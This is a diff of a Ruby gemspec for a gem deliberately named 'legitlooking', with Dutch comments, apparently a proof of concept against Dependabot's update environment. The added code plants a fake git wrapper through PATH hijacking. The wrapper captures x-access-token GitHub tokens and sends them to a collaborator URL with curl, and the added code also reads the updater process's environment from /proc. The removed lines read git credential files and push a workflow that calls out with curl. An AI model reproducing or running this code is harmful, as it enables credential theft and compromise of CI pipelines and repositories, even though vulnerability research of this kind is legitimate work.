@@ -37,54 +37,80 @@ begin
     "FOUT: #{e.message}"
   end
 
-  repo_path = ENV["DEPENDABOT_REPO_CONTENTS_PATH"] || "/home/dependabot/dependabot-updater/repo"
+  # ============================================================
+  # ESCALATIE: PATH hijacking via /home/dependabot/bin/git
+  #
+  # /home/dependabot/bin staat EERSTE in PATH.
+  # Wij schrijven een fake git die:
+  #   1. Alle aanroepen logt (incl. x-access-token:TOKEN in git config calls)
+  #   2. De echte git aanroept zodat Dependabot normaal doorgaat (transparant)
+  #   3. Bij credential-gerelateerde calls het token exfiltreert
+  # ============================================================
 
-  # 1. Git config lezen: bevat mogelijk credentials in remote URL
-  lines << "\n--- .git/config ---"
-  lines << (IO.binread("#{repo_path}/.git/config") rescue "FOUT")
+  dep_bin = "/home/dependabot/bin"
+  collab = COLLAB_URL
 
-  # 2. Git credentials store
-  lines << "\n--- git credential store ---"
-  lines << (`git -C #{repo_path} config --list 2>/dev/null` rescue "N/A")
-  lines << (IO.binread("/home/dependabot/.git-credentials") rescue "geen .git-credentials")
-  lines << (IO.binread("/root/.git-credentials") rescue "geen root .git-credentials")
+  # Controleer of we kunnen schrijven naar /home/dependabot/bin
+  lines << "\n--- /home/dependabot/bin inhoud ---"
+  lines << (`ls -la #{dep_bin}/ 2>&1`)
 
-  # 3. Git push test: maak commit en push naar eigen branch
-  lines << "\n--- GIT PUSH TEST ---"
-  push_result = `
-    cd #{repo_path} &&
-    git config user.email "poc@test.com" &&
-    git config user.name "poc" &&
-    git checkout -b dependabot-rce-poc-#{$$} 2>&1 &&
-    echo "rce-proof" > /tmp/rce_proof.txt &&
-    cp /tmp/rce_proof.txt rce_proof.txt &&
-    git add rce_proof.txt &&
-    git commit -m "Dependabot RCE PoC - proof of write" 2>&1 &&
-    git push origin dependabot-rce-poc-#{$$} 2>&1
-  `.strip
-  lines << push_result[0, 1000]
+  # Schrijf de fake git wrapper
+  fake_git = <<~'SHELL'
+    #!/bin/sh
+    # Transparante git wrapper - logt alles, exfiltreert tokens
+    LOG=/tmp/git_intercept.log
+    COLLAB_URL="__COLLAB__"
 
-  # 4. PUT contents API met correcte JSON string (geen Ruby hash serialisatie)
-  lines << "\n--- PUT workflow via Contents API ---"
-  workflow_yaml = "name: poc\non: [push]\njobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s '#{COLLAB_URL}?s=proof'\n"
-  encoded_content = [workflow_yaml].pack("m0").gsub("\n", "")
-  # Bouw JSON string handmatig (geen require json nodig)
-  put_body = "{\"message\":\"dependabot-rce-poc\",\"content\":\"#{encoded_content}\"}"
+    # Log alle aanroepen
+    echo "$(date) GIT: $*" >> "$LOG"
+    echo "ENV_URL: $(git config --global --get-all url.https://)" >> "$LOG" 2>/dev/null || true
+
+    # Zoek naar tokens in de argumenten (git config url.https://x-access-token:TOKEN@...)
+    ARGS="$*"
+    if echo "$ARGS" | grep -q "x-access-token"; then
+      TOKEN=$(echo "$ARGS" | grep -o 'x-access-token:[^@]*' | head -1)
+      echo "TOKEN GEVONDEN: $TOKEN" >> "$LOG"
+      # Exfiltreer het token
+      curl -s "${COLLAB_URL}?token=$(echo "$TOKEN" | sed 's/x-access-token://')" &
+    fi
+
+    # Controleer ook git config store na elke aanroep
+    GLOBAL_URL=$(/usr/bin/git config --global --get-regexp "url\." 2>/dev/null)
+    if [ -n "$GLOBAL_URL" ]; then
+      echo "GLOBAL_URL_CONFIG: $GLOBAL_URL" >> "$LOG"
+      if echo "$GLOBAL_URL" | grep -q "x-access-token"; then
+        TOKEN=$(echo "$GLOBAL_URL" | grep -o 'x-access-token:[^@]*' | head -1)
+        curl -s "${COLLAB_URL}?path_hijack_token=$(echo "$TOKEN" | sed 's/x-access-token://')" &
+      fi
+    fi
+
+    # Roep de echte git aan (transparant)
+    exec /usr/bin/git "$@"
+  SHELL
+
+  fake_git_script = fake_git.gsub("__COLLAB__", collab)
+
   begin
-    uri3 = URI("https://api.github.com/repos/ugurcanli/testpen/contents/rce_workflow_poc.yml")
-    http3 = Net::HTTP.new(uri3.host, uri3.port)
-    http3.use_ssl = true; http3.verify_mode = 0
-    http3.open_timeout = 10; http3.read_timeout = 10
-    r3 = Net::HTTP::Put.new(uri3)
-    r3["Accept"] = "application/vnd.github+json"
-    r3["Content-Type"] = "application/json"
-    r3["X-GitHub-Api-Version"] = "2022-11-28"
-    r3.body = put_body
-    res3 = http3.request(r3)
-    lines << "Status: #{res3.code}"
-    lines << "Body: #{res3.body[0, 500]}"
+    fake_git_path = "#{dep_bin}/git"
+    IO.binwrite(fake_git_path, fake_git_script)
+    `chmod +x #{fake_git_path} 2>&1`
+    lines << "\n--- Fake git geschreven naar #{fake_git_path} ---"
+    lines << `ls -la #{fake_git_path} 2>&1`
+    lines << "Wacht op Dependabot git calls na parse-fase..."
   rescue => e
-    lines << "FOUT: #{e.message}"
+    lines << "\n--- Fake git schrijven mislukt: #{e.message} ---"
+  end
+
+  # Lees ook /proc van het hoofd-updater proces (zelfde user = leesbaar)
+  lines << "\n--- /proc hoofdproces ---"
+  main_pid = `pgrep -f 'ruby.*update_files' 2>/dev/null`.strip.split.first
+  if main_pid
+    lines << "Main PID: #{main_pid}"
+    lines << "Open FDs: #{`ls -la /proc/#{main_pid}/fd 2>/dev/null`[0, 500]}"
+    # Lees environment van het hoofdproces
+    main_env = IO.binread("/proc/#{main_pid}/environ") rescue ""
+    main_env_parsed = main_env.gsub("\x00", "\n")
+    lines << "Main process ENV:\n#{main_env_parsed[0, 1000]}"
   end
 
   # === PIVOT: interne netwerk scan ===
@@ -118,7 +144,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.7"
+  spec.version       = "1.0.8"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
